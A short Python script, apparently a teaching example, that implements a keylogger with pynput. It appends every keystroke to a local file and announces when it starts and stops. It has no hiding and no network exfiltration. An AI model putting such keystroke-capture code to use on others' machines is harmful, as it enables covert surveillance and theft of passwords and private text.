import pynput.keyboard

# Define the log file name
log_file = "keystrokes.txt"

# --- Function to write key strokes to the log file ---
def on_press(key):
    try:
        # For alphanumeric characters, log the character
        char = key.char
    except AttributeError:
        # For special keys (e.g., Space, Enter, Shift), log the key name
        # We replace 'Key.' with an empty string for cleaner logging
        char = f'[{str(key).replace("Key.", "")}]'

    # Open the file in append mode ('a') and write the character
    with open(log_file, "a") as f:
        f.write(char)

# --- Function to handle the release of the key (Optional: used for stopping) ---
def on_release(key):
    # This is often used to stop the keylogger. 
    # For example, stop when the 'Esc' key is pressed.
    if key == pynput.keyboard.Key.esc:
        # Stop listener
        return False

# --- Main execution block ---
def start_keylogger():
    # Print a message to confirm the keylogger is starting
    print(f"Keylogger started. Keystrokes will be saved to '{log_file}'...")
    print("Press 'Esc' to stop the keylogger.")
    
    # Create the listener object
    # The 'suppress=True' argument is intentionally omitted to avoid 
    # potential misuse by making the keylogger more intrusive than necessary.
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        # Start listening for key presses
        listener.join()
    
    print("Keylogger stopped.")

if __name__ == "__main__":
    start_keylogger()